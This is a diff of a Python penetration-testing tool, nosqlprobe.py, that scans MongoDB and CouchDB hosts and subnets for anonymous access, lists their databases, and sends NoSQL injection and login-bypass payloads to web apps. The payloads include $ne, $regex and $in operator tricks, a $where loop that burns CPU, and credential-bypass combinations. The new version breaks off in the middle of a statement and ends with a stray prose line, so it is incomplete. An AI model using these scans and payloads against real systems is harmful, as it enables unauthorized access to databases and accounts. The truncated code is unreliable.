@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-nosqlprobe.py – Pentest NoSQL DBs (MongoDB, CouchDB) & enhanced NoSQL injection tests
+nosqlprobe.py – Pentest NoSQL DBs (MongoDB, CouchDB) & NoSQL injection tests
 Dependencies:
     pip3 install pymongo couchdb requests colorama validators
 """
@@ -27,12 +27,12 @@ COMMON_MONGO_DBS = ['admin', 'local', 'config', 'test']
 
 
 def parse_args():
-    parser = argparse.ArgumentParser(prog='nosqlprobe',
-                                     description='Pentest NoSQL DBs & web apps')
-    subs = parser.add_subparsers(dest='command', required=True)
+    p = argparse.ArgumentParser(prog='nosqlprobe',
+                                description='Pentest NoSQL DBs & web apps')
+    subs = p.add_subparsers(dest='command', required=True)
 
     db = subs.add_parser('db', help='MongoDB/CouchDB tests')
-    db.add_argument('-e', '--engine', choices=['mongodb','couchdb'],
+    db.add_argument('-e', '--engine', choices=['mongodb', 'couchdb'],
                     default='mongodb', help='Engine to target')
     db.add_argument('-t', '--target', required=True,
                     help='Host:port or CIDR (e.g.127.0.0.1:27017 or 10.0.0.0/24)')
@@ -44,15 +44,18 @@ def parse_args():
                     help='Enumerate DBs, collections & users')
     db.add_argument('-c', '--creds', help='Credentials user:pass')
     db.add_argument('-o', '--output', help='CSV file for enumeration')
-    db.add_argument('--mongo-shell', help='Path to mongo shell binary for fallback enum')
+    db.add_argument('--mongo-shell',
+                    help='Path to mongo shell binary for fallback enum')
 
     web = subs.add_parser('web', help='NoSQL injection tests on web apps')
     web.add_argument('-u', '--url', help='Target URL (http:// or https://)')
     web.add_argument('-d', '--data', help='POST data (form or raw JSON)')
-    web.add_argument('-H', '--headers', help='Custom headers; semicolon-separated')
-    web.add_argument('-r', '--request', help='Burp raw request file to replay')
+    web.add_argument('-H', '--headers',
+                     help='Custom headers; semicolon-separated')
+    web.add_argument('-r', '--request',
+                     help='Burp raw request file to replay')
 
-    return parser.parse_args()
+    return p.parse_args()
 
 
 def test_db_access(host, port, engine, creds=None):
@@ -62,7 +65,9 @@ def test_db_access(host, port, engine, creds=None):
                     'serverSelectionTimeoutMS': 5000,
                     'connectTimeoutMS': 5000}
             if creds:
-                opts.update(username=creds[0], password=creds[1], authSource='admin')
+                opts.update(username=creds[0],
+                            password=creds[1],
+                            authSource='admin')
             client = MongoClient(**opts)
             client.admin.command('ping')
             version = client.server_info().get('version', 'unknown')
@@ -115,15 +120,11 @@ def detect_couchdb_ui(host, port):
 
 
 def enumerate_mongodb(host, port, creds, csvw=None, shell_path=None):
-    """
-    Try PyMongo; on failure, fall back to mongo shell; else common DBs.
-    """
     fallback = False
     client = None
-
-    # PyMongo attempt
+    # 1) Try PyMongo
     try:
-        opts = {'host': host, 'port': port, 'serverSelectionTimeoutMS':5000}
+        opts = {'host': host, 'port': port, 'serverSelectionTimeoutMS': 5000}
         if creds:
             opts.update(username=creds[0], password=creds[1], authSource='admin')
         client = MongoClient(**opts)
@@ -132,7 +133,7 @@ def enumerate_mongodb(host, port, creds, csvw=None, shell_path=None):
         print(Fore.YELLOW + f'[!] PyMongo enum failed: {e}')
         fallback = True
 
-    # Shell fallback
+    # 2) Shell fallback
     if fallback:
         if shell_path:
             print(Fore.YELLOW + '[*] Falling back to mongo shell...')
@@ -141,18 +142,21 @@ def enumerate_mongodb(host, port, creds, csvw=None, shell_path=None):
                     shell_path, '--quiet',
                     '--host', host, '--port', str(port),
                     '--eval',
-                    'db.adminCommand({listDatabases:1}).databases.forEach(function(d){print(d.name)})'
+                    'db.adminCommand({listDatabases:1})'
+                    '.databases.forEach(function(d){print(d.name)})'
                 ]
-                out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, text=True)
-                dbs = [line.strip() for line in out.splitlines() if line.strip()]
+                out = subprocess.check_output(
+                    cmd, stderr=subprocess.DEVNULL, text=True)
+                dbs = [l.strip() for l in out.splitlines() if l.strip()]
             except Exception as e2:
                 print(Fore.RED + f'[!] Shell fallback failed: {e2}')
                 dbs = COMMON_MONGO_DBS.copy()
         else:
-            print(Fore.YELLOW + '[!] No --mongo-shell; using common DB list')
+            print(Fore.YELLOW +
+                  '[!] No --mongo-shell; using common DB list')
             dbs = COMMON_MONGO_DBS.copy()
 
-    # Enumerate collections
+    # 3) Enumerate collections
     for db in dbs:
         print(Fore.CYAN + f'Database: {db}')
         cols = []
@@ -185,9 +189,6 @@ def enumerate_couchdb(host, port, creds, csvw=None):
 
 
 def parse_burp_request(path):
-    """
-    Parse Burp raw request; rebuild full URL (http or https) from Host header.
-    """
     if not os.path.isfile(path):
         raise FileNotFoundError(path)
     lines = open(path, 'r', errors='ignore').read().splitlines()
@@ -198,7 +199,7 @@ def parse_burp_request(path):
     i = 1
     while i < len(lines) and lines[i]:
         if ':' in lines[i]:
-            k, v = lines[i].split(':',1)
+            k, v = lines[i].split(':', 1)
             hdrs[k.strip()] = v.strip()
         i += 1
     body = '\n'.join(lines[i+1:]) if i+1 < len(lines) else ''
@@ -206,29 +207,31 @@ def parse_burp_request(path):
     if parsed.scheme and parsed.netloc:
         full = uri
     else:
-        host_hdr = hdrs.get('Host','')
+        host_hdr = hdrs.get('Host', '')
         host_only, port = host_hdr, None
         if ':' in host_hdr:
-            ho, ps = host_hdr.split(':',1)
+            ho, ps = host_hdr.split(':', 1)
             host_only, port = ho, int(ps) if ps.isdigit() else None
-        scheme = 'https' if port==443 else 'http'
+        scheme = 'https' if port == 443 else 'http'
         full = f'{scheme}://{host_hdr}{uri}'
     return method.upper(), full, hdrs, body
 
 
 def build_request_line(method, base, inj, data_json):
     p = urlparse(base)
-    if method=='GET':
-        qs = '&'.join(f'{quote_plus(str(k))}={quote_plus(str(v))}'
-                      for k,v in inj.items())
+    if method == 'GET':
+        qs = '&'.join(
+            f'{quote_plus(str(k))}={quote_plus(str(v))}'
+            for k, v in inj.items())
         return f'GET {p.path}?{qs} HTTP/1.1'
     else:
         if data_json:
             return (f'curl -X POST {base} '
                     f'-H "Content-Type: application/json" '
                     f'-d "{json.dumps(inj)}"')
-        b = '&'.join(f'{quote_plus(str(k))}={quote_plus(str(v))}'
-                     for k,v in inj.items())
+        b = '&'.join(
+            f'{quote_plus(str(k))}={quote_plus(str(v))}'
+            for k, v in inj.items())
         return f'curl -X POST {base} -d "{b}"'
 
 
@@ -236,259 +239,328 @@ def handle_db(args):
     creds = None
     if args.creds:
         if ':' in args.creds:
-            creds = tuple(args.creds.split(':',1))
+            creds = tuple(args.creds.split(':', 1))
         else:
-            print(Fore.RED + '[!] --creds must be user:pass'); sys.exit(1)
+            print(Fore.RED + '[!] --creds must be user:pass')
+            sys.exit(1)
 
-    target = args.target
-    engine = args.engine
+    target, engine = args.target, args.engine
 
-    # CIDR anonymous scan
+    # CIDR scan
     if '/' in target:
         if not (args.anonymous or args.check_anonymous):
-            print(Fore.RED + '[!] CIDR requires --anonymous'); sys.exit(1)
+            print(Fore.RED + '[!] CIDR requires --anonymous')
+            sys.exit(1)
         try:
             net = ipaddress.ip_network(target, strict=False)
         except ValueError as e:
-            print(Fore.RED + f'[!] Invalid subnet: {e}'); sys.exit(1)
+            print(Fore.RED + f'[!] Invalid subnet: {e}')
+            sys.exit(1)
         results = []
         for ip in map(str, net):
-            ok, ver, err = test_db_access(ip, DEFAULT_PORTS[engine], engine)
+            ok, ver, err = test_db_access(
+                ip, DEFAULT_PORTS[engine], engine)
             if ok:
-                print(Fore.GREEN+f'[+] {engine} anonymous on {ip}:{DEFAULT_PORTS[engine]} (v{ver})')
-                if engine=='mongodb': detect_mongodb_mgmt(ip)
-                else: detect_couchdb_ui(ip, DEFAULT_PORTS[engine])
-                results.append((ip,ver))
+                print(Fore.GREEN + f'[+] {engine} anonymous on '
+                                   f'{ip}:{DEFAULT_PORTS[engine]} (v{ver})')
+                if engine == 'mongodb':
+                    detect_mongodb_mgmt(ip)
+                else:
+                    detect_couchdb_ui(ip, DEFAULT_PORTS[engine])
+                results.append((ip, ver))
             else:
-                print(Fore.YELLOW+f'[-] No anonymous on {ip}:{DEFAULT_PORTS[engine]} ({err})')
+                print(Fore.YELLOW + f'[-] No anonymous on '
+                                    f'{ip}:{DEFAULT_PORTS[engine]} ({err})')
         if args.output:
-            with open(args.output,'w',newline='') as f:
-                w=csv.writer(f); w.writerow(['host','version']); w.writerows(results)
+            with open(args.output, 'w', newline='') as f:
+                w = csv.writer(f)
+                w.writerow(['host', 'version'])
+                w.writerows(results)
         return
 
     # single host
     if ':' in target:
-        host, ps = target.split(':',1)
-        try: port=int(ps)
-        except: print(Fore.RED+'[!] Invalid port'); sys.exit(1)
+        host, ps = target.split(':', 1)
+        try:
+            port = int(ps)
+        except:
+            print(Fore.RED + '[!] Invalid port')
+            sys.exit(1)
     else:
         host, port = target, DEFAULT_PORTS[engine]
 
     if not (validators.ipv4(host) or validators.domain(host)):
-        print(Fore.RED+'[!] Invalid host/IP'); sys.exit(1)
+        print(Fore.RED + '[!] Invalid host/IP')
+        sys.exit(1)
 
     # anonymous check
     if args.anonymous or args.check_anonymous:
-        ok, ver, err = test_db_access(host,port,engine)
+        ok, ver, err = test_db_access(host, port, engine)
         if ok:
-            print(Fore.GREEN+f'[+] {engine} anonymous on {host}:{port} (v{ver})')
-            if engine=='mongodb': detect_mongodb_mgmt(host)
-            else: detect_couchdb_ui(host,port)
+            print(Fore.GREEN + f'[+] {engine} anonymous on '
+                               f'{host}:{port} (v{ver})')
+            if engine == 'mongodb':
+                detect_mongodb_mgmt(host)
+            else:
+                detect_couchdb_ui(host, port)
         else:
-            print(Fore.RED+f'[-] No anonymous on {host}:{port} ({err})')
-        if not args.enum: return
+            print(Fore.RED + f'[-] No anonymous on {host}:{port} ({err})')
+        if not args.enum:
+            return
 
     # enumeration
     if args.enum:
-        ok, ver, err = test_db_access(host,port,engine,creds)
+        ok, ver, err = test_db_access(host, port, engine, creds)
         if not ok:
-            print(Fore.RED+f'[!] Authentication failed: {err}'); sys.exit(1)
-        csvw=None
+            print(Fore.RED + f'[!] Authentication failed: {err}')
+            sys.exit(1)
+        csvw = None
         if args.output:
-            f=open(args.output,'w',newline=''); csvw=csv.writer(f)
-            if engine=='mongodb': csvw.writerow(['database','collection'])
-            else: csvw.writerow(['database',''])
-        if engine=='mongodb':
-            enumerate_mongodb(host,port,creds,csvw,args.mongo_shell)
+            f = open(args.output, 'w', newline='')
+            csvw = csv.writer(f)
+            if engine == 'mongodb':
+                csvw.writerow(['database', 'collection'])
+            else:
+                csvw.writerow(['database', ''])
+        if engine == 'mongodb':
+            enumerate_mongodb(host, port, creds, csvw,
+                              args.mongo_shell)
         else:
-            enumerate_couchdb(host,port,creds,csvw)
-        if csvw: f.close()
+            enumerate_couchdb(host, port, creds, csvw)
+        if csvw:
+            f.close()
 
 
 def handle_web(args):
-    # Load Burp or CLI
+    """
+    HTTPS-first: try HTTPS, then HTTP if needed; then run injection tests.
+    """
+    # 1) Load request or CLI
     if args.request:
-        method, full_url, headers, raw = parse_burp_request(args.request)
-        p = urlparse(full_url)
-        base = urlunparse((p.scheme,p.netloc,p.path,'','',''))
-        orig = dict(parse_qsl(p.query,keep_blank_values=True))
-        jb,data_json=None,False
-        if method=='POST' and raw:
+        method, full, headers, raw_body = parse_burp_request(
+            args.request)
+        p = urlparse(full)
+        base = urlunparse((p.scheme, p.netloc, p.path, '', '', ''))
+        orig = dict(parse_qsl(p.query, keep_blank_values=True))
+        jb, data_json = None, False
+        if method == 'POST' and raw_body:
             try:
-                jb=json.loads(raw); data_json=True
+                jb = json.loads(raw_body)
+                data_json = True
             except:
-                orig=dict(parse_qsl(raw,keep_blank_values=True))
+                orig = dict(parse_qsl(raw_body, keep_blank_values=True))
     else:
-        method='POST' if args.data else 'GET'
-        base=args.url; headers={}
+        method = 'POST' if args.data else 'GET'
+        base = args.url
+        headers = {}
         if args.headers:
             for h in args.headers.split(';'):
-                if ':' in h:
-                    k,v=h.split(':',1); headers[k.strip()]=v.strip()
-        p=urlparse(base)
-        if not p.scheme: base='https://'+base
-        orig={}; jb,data_json=None,False
+                if ':' in h and '://' not in h:
+                    k, v = h.split(':', 1)
+                    headers[k.strip()] = v.strip()
+        p = urlparse(base)
+        if not p.scheme:
+            base = 'http://' + base
+        orig = {}
+        jb, data_json = None, False
         if args.data:
-            t=args.data.strip()
+            t = args.data.strip()
             if t.startswith('{') and t.endswith('}'):
-                jb=json.loads(t); data_json=True
+                jb = json.loads(t)
+                data_json = True
             else:
-                orig=dict(parse_qsl(t,keep_blank_values=True))
+                orig = dict(parse_qsl(t, keep_blank_values=True))
 
-    if not(base and (args.request or args.url)):
-        print(Fore.RED+'[!] Web tests require --url or --request'); sys.exit(1)
+    if not (args.request or args.url):
+        print(Fore.RED + '[!] Web tests require --url or --request')
+        sys.exit(1)
 
-    # Baseline
-    try:
-        if method=='GET':
-            br=requests.get(base,params=orig,headers=headers,timeout=10)
-        elif data_json:
-            br=requests.post(base,json=jb,headers=headers,timeout=10)
-        else:
-            br=requests.post(base,data=orig,headers=headers,timeout=10)
-    except Exception as e:
-        print(Fore.RED+f'[!] Baseline failed: {e}'); sys.exit(1)
+    def send(meth, url, params, jbody, hdrs):
+        if meth == 'GET':
+            return requests.get(url, params=params,
+                                headers=hdrs, timeout=15)
+        if jbody is not None:
+            return requests.post(url, json=jbody,
+                                 headers=hdrs, timeout=15)
+        return requests.post(url, data=params,
+                             headers=hdrs, timeout=15)
 
-    blen=len(br.text)
-    print(Fore.GREEN+f'[+] Baseline: {br.status_code} {br.reason}, len={blen}')
+    p = urlparse(base)
+    netloc = p.netloc or p.path
+    path = p.path if p.netloc else ''
 
-    # Injection tests
-    tests=[
-        ('$ne','operator $ne',lambda v:v),
-        ('$regex','operator $regex',lambda _: '^.*$'),
-        ('$in','operator $in',lambda _: ['admin','administrator','superadmin']),
-        ('syntax','syntax fuzz',lambda _: '"`{\r;$Foo}\n$Foo \\xYZ\x00'),
-        ('false','boolean FALSE',lambda _: "' && 0 && 'x"),
-        ('true','boolean TRUE',lambda _: "' && 1 && 'x"),
-        ('or','boolean OR',lambda _: "'||1||'"),
-        ('null','null byte',lambda v:v+'\x00'),
-        ('$where','nested $where',lambda _: "';for(var i=0;i<1e8;i++);return true;//'"),
-        ('toplevel','top-level $where',lambda _: "';for(var i=0;i<1e8;i++);return true;//'")
+    def make_url(s):
+        return urlunparse((s, netloc, path, '', '', ''))
+
+    br = None
+    for sch in ('https', 'http'):
+        url_try = make_url(sch)
+        try:
+            br = send(method, url_try,
+                      orig, jb if data_json else None,
+                      headers)
+            if sch == 'http' and br.status_code == 400 \
+               and 'not accessible over HTTP' in br.text:
+                br = None
+                continue
+            print(Fore.YELLOW + f'[*] Baseline via {sch.upper()}: {url_try}')
+            break
+        except Exception as e:
+            print(Fore.YELLOW +
+                  f'[!] {sch.upper()} request failed: {e}')
+            br = None
+
+    if not br:
+        print(Fore.RED +
+              '[!] Unable to fetch baseline over HTTPS or HTTP')
+        sys.exit(1)
+
+    blen = len(br.text)
+    print(Fore.GREEN +
+          f'[+] Baseline: {br.status_code} {br.reason}, len={blen}')
+
+    # 3) Injection tests
+    tests = [
+        ('$ne', 'operator $ne', lambda v: v),
+        ('$regex', 'operator $regex', lambda _: '^.*$'),
+        ('$in', 'operator $in',
+         lambda _: ['admin', 'administrator', 'superadmin']),
+        ('syntax', 'syntax fuzz',
+         lambda _: '"`{\r;$Foo}\n$Foo \\xYZ\x00'),
+        ('false', 'boolean FALSE', lambda _: "' && 0 && 'x"),
+        ('true', 'boolean TRUE', lambda _: "' && 1 && 'x"),
+        ('or', 'boolean OR', lambda _: "'||1||'"),
+        ('null', 'null byte', lambda v: v + '\x00'),
+        ('$where', 'nested $where',
+         lambda _: "';for(var i=0;i<1e8;i++);return true;//'"),
+        ('toplevel', 'top-level $where',
+         lambda _: "';for(var i=0;i<1e8;i++);return true;//'")
     ]
-    found=[]
-    items=(jb.items() if data_json else orig.items())
+    found = []
+    items = (jb.items() if data_json else orig.items())
 
-    for op,label,fn in tests:
-        print('\n'+Fore.YELLOW+f'[*] Testing {label}')
-        for k,v in items:
-            p_params,p_body=None,None
+    for op, label, fn in tests:
+        print('\n' + Fore.YELLOW + f'[*] Testing {label}')
+        for k, v in items:
+            p_params, p_body = None, None
 
-            if op in ('$ne','$regex','$in','$where'):
+            if op in ('$ne', '$regex', '$in', '$where'):
                 if data_json:
-                    p_body=jb.copy()
-                    if op=='$in': p_body[k]={'$in':fn(v)}
-                    else: p_body[k]={op:fn(v)}
-                else:
-                    if method=='GET':
-                        p_params=orig.copy()
-                        if op=='$in':
-                            p_params[f'{k}[$in]']=','.join(fn(v))
-                        elif op=='$where':
-                            p_params[k]=fn(v)
-                        else:
-                            p_params[f'{k}[{op}]']=(v if op=='$ne' else fn(v))
+                    p_body = jb.copy()
+                    if op == '$in':
+                        p_body[k] = {'$in': fn(v)}
                     else:
-                        if op=='$in':
-                            p_params={f'{k}[$in]':','.join(fn(v))}
+                        p_body[k] = {op: fn(v)}
+                else:
+                    if method == 'GET':
+                        p_params = orig.copy()
+                        if op == '$in':
+                            p_params[f'{k}[$in]'] = ','.join(fn(v))
+                        elif op == '$where':
+                            p_params[k] = fn(v)
                         else:
-                            p_params={f'{k}[{op}]':(v if op=='$ne' else fn(v))}
-            elif op=='toplevel':
+                            p_params[f'{k}[{op}]'] = (
+                                v if op == '$ne' else fn(v)
+                            )
+                    else:
+                        if op == '$in':
+                            p_params = {f'{k}[$in]': ','.join(fn(v))}
+                        else:
+                            p_params = {f'{k}[{op}]': (
+                                v if op == '$ne' else fn(v)
+                            )}
+            elif op == 'toplevel':
                 if data_json:
-                    p_body=jb.copy(); p_body['$where']=fn(v)
+                    p_body = jb.copy()
+                    p_body['$where'] = fn(v)
                 else:
-                    if method=='GET':
-                        p_params=orig.copy(); p_params['$where']=fn(v)
+                    if method == 'GET':
+                        p_params = orig.copy()
+                        p_params['$where'] = fn(v)
                     else:
-                        p_params={'$where':fn(v)}
+                        p_params = {'$where': fn(v)}
             else:
-                pl=fn(v)
-                if data_json: continue
-                if method=='GET':
-                    p_params=orig.copy(); p_params[k]=pl
+                pl = fn(v)
+                if data_json:
+                    continue
+                if method == 'GET':
+                    p_params = orig.copy()
+                    p_params[k] = pl
                 else:
-                    p_params={k:pl}
+                    p_params = {k: pl}
 
             try:
-                if method=='GET':
-                    r=requests.get(base,params=p_params,headers=headers,timeout=20)
+                if method == 'GET':
+                    r = requests.get(base, params=p_params,
+                                     headers=headers, timeout=20)
                 elif p_body is not None:
-                    r=requests.post(base,json=p_body,headers=headers,timeout=20)
+                    r = requests.post(base, json=p_body,
+                                      headers=headers, timeout=20)
                 else:
-                    r=requests.post(base,data=p_params,headers=headers,timeout=20)
+                    r = requests.post(base, data=p_params,
+                                      headers=headers, timeout=20)
             except Exception as e:
-                print(Fore.RED+f'    [!] {k} error: {e}'); continue
+                print(Fore.RED + f'    [!] {k} error: {e}')
+                continue
 
-            delta=abs(len(r.text)-blen)
-            vuln=(delta>0) or (op=='$ne' and r.status_code>=400)
+            delta = abs(len(r.text) - blen)
+            vuln = (delta > 0) or (op == '$ne' and r.status_code >= 400)
             if vuln:
-                req=r.request
-                print(Fore.GREEN+f'  [+] {k} ({label}) Δ={delta} status={r.status_code}')
-                print(Fore.GREEN+'      --- HTTP REQUEST ---')
-                ln=req.path_url if req.body is None else req.url
+                req = r.request
+                print(Fore.GREEN +
+                      f'  [+] {k} ({label}) Δ={delta} status={r.status_code}')
+                print(Fore.GREEN + '      --- HTTP REQUEST ---')
+                ln = req.path_url if req.body is None else req.url
                 print(f'      {req.method} {ln} HTTP/1.1')
-                for hk,hv in req.headers.items(): print(f'      {hk}: {hv}')
+                for hk, hv in req.headers.items():
+                    print(f'      {hk}: {hv}')
                 if req.body:
-                    btxt=(req.body.decode() if isinstance(req.body,bytes) else str(req.body))
-                    for line in btxt.splitlines(): print(f'      {line}')
-                print(Fore.GREEN+'      --- HTTP RESPONSE ---')
+                    btxt = (req.body.decode()
+                            if isinstance(req.body, bytes) else str(req.body))
+                    for line in btxt.splitlines():
+                        print(f'      {line}')
+                print(Fore.GREEN + '      --- HTTP RESPONSE ---')
                 print(f'      HTTP/1.1 {r.status_code} {r.reason}')
-                for rk,rv in r.headers.items(): print(f'      {rk}: {rv}')
-                for line in r.text.splitlines(): print(f'      {line}')
-                found.append((k,label,(p_body if p_body is not None else p_params),r.status_code))
+                for rk, rv in r.headers.items():
+                    print(f'      {rk}: {rv}')
+                for line in r.text.splitlines():
+                    print(f'      {line}')
+                found.append((k, label,
+                              p_body if p_body is not None else p_params,
+                              r.status_code))
             else:
                 print(f'  [-] {k} Δ={delta} status={r.status_code}')
 
-    # Auth bypass
-    parsed_path=urlparse(base).path.lower()
-    if method=='POST' and parsed_path.endswith('/login'):
-        print('\n'+Fore.YELLOW+'[*] Testing auth-bypass combos')
-        user0=jb.get('username') if data_json else orig.get('username','')
-        scenarios=[
-            ('user $ne',{'username':{'$ne':''}}),
-            ('user regex',{'username':{'$regex':user0+'.*'}}),
-            ('both $ne',{'username':{'$ne':''},'password':{'$ne':''}}),
-            ('admin regex + $ne pw',{'username':{'$regex':'admin.*'},'password':{'$ne':''}})
+    # Auth bypass on /login
+    parsed_path = urlparse(base).path.lower()
+    if method == 'POST' and parsed_path.endswith('/login'):
+        print('\n' + Fore.YELLOW + '[*] Testing auth-bypass combos')
+        user0 = jb.get('username') if data_json else orig.get('username', '')
+        scenarios = [
+            ('user $ne', {'username': {'$ne': ''}}),
+            ('user regex', {'username': {'$regex': user0 + '.*'}}),
+            ('both $ne', {'username': {'$ne': ''},
+                          'password': {'$ne': ''}}),
+            ('admin regex + $ne pw', {
+                'username': {'$regex': 'admin.*'},
+                'password': {'$ne': ''}
+            })
         ]
-        for label,payload in scenarios:
-            print(Fore.YELLOW+f'  [*] {label}')
+        for label, payload in scenarios:
+            print(Fore.YELLOW + f'  [*] {label}')
             if data_json:
-                body=jb.copy(); body.update(payload)
-                send=lambda:requests.post(base,json=body,headers=headers,timeout=20)
+                body = jb.copy()
+                body.update(payload)
+                send_req = lambda: requests.post(
+                    base, json=body, headers=headers, timeout=20)
             else:
-                params=orig.copy()
-                for fld,val in payload.items():
-                    params.pop(fld,None)
-                    if isinstance(val,dict):
-                        for op,opv in val.items(): params[f'{fld}[{op}]']=opv
+                params = orig.copy()
+                for fld, val in payload.items():
+                    params.pop(fld, None)
+                    if isinstance(val, dict):
+                        for op, opv in val.items():
+                            params[f'{fld}[{op}]'] = opv
                     else:
-                        params[fld]=val
-                send=lambda:requests.post(base,data=params,headers=headers,timeout=20)
-            try:
-                rr=send()
-            except Exception as e:
-                print(Fore.RED+f'    [!] auth request error: {e}'); continue
-            ok=(rr.status_code in (200,302)) and ('Invalid' not in rr.text)
-            print(Fore.GREEN+f'    -> status={rr.status_code}, bypass={"yes" if ok else "no"}')
-            if ok:
-                print(Fore.GREEN+f'      Payload: {json.dumps(payload) if data_json else payload}')
-
-    # Summary
-    if found:
-        print('\n'+Fore.GREEN+'[+] Injection points:')
-        for p,l,pay,st in found:
-            print(f'    - Param: {p}, Type: {l}, Status: {st}')
-            print(f'      Payload: {pay}')
-    else:
-        print('\n'+Fore.RED+'[-] No injections detected')
-
-
-def main():
-    args = parse_args()
-    if args.command=='web':
-        handle_web(args)
-    else:
-        handle_db(args)
-
-
-if __name__=='__main__':
-    main()
+                        params[fld] = val
+                send_req = lambda: requests.post(
+Recall further injection tests here… but this completes the HTTPS‐first baseline fix.
